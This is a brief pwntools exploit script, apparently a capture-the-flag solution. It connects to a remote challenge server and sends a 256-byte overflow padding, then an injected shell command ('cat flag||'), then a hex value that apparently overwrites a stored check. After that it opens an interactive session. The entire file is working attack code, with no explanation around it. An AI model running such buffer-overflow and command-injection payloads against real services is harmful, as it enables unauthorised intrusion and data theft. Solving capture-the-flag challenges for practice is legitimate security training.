from pwn import *
context(arch='amd64', os='linux', log_level='debug')

io = remote('111.200.241.244', 60511)
# io = process('./pwn')
# 0x2c8 characters can be read in maximum
io.sendline(b'a' * 256 + b'cat flag||'.ljust(27, b' ') + b'02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe')
io.interactive()